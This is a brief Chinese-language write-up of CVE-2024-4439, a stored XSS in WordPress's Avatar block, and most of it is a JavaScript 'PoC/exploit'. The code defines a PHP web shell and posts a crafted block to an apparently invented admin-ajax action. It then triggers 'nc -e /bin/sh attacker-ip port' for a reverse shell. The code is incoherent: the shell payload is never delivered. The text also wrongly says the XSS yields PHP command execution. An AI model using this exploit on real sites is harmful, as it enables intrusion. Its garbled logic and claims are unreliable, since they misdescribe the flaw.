影响描述

  在WordPress Core 6.5.1之前的版本中发现了一个重要的安全漏洞，被跟踪为CVE-2024-4439。此漏洞是一个存储的跨站点脚本（XSS）漏洞，允许攻击者通过Avatar块注入有害的web脚本。该漏洞是由于用户显示名称的输出转义不足而产生的，这使得经过身份验证和未经身份验证的攻击者都可以执行任意PHP命令。



poc&exp

```html

<script>
// Payload: Reverse Shell
const reverseShellPayload = `<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>`;

// Function to send HTTP GET request
function sendRequest(url) {
    fetch(url)
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
}

// Exploit: Inject Reverse Shell Payload
const exploitUrl = 'http://target-site.com/wp-admin/admin-ajax.php?action=rest_core_controller_create_item&collection_name=avatars';
const exploitData = JSON.stringify({
    attributes: {
        size: 96,
        userId: 1,
        style: {
            border: {
                color: 'red", "type": "text/css", "onerror": "eval(atob(this.id))//'
            }
        }
    },
    content: 'Exploited!',
    blockName: 'core/avatar',
    clientId: 'exploited',
    blockVersion: 1,
    innerBlocks: []
});
fetch(exploitUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: exploitData
})
.then(response => response.json())
.then(data => {
    console.log('Exploit successful:', data);
    const reverseShellUrl = `http://target-site.com/wp-content/themes/twentytwenty/header.php?cmd=${encodeURIComponent('nc -e /bin/sh attacker-ip port')}`;
    sendRequest(reverseShellUrl);
})
.catch(error => console.error('Exploit failed:', error));
</script>
```

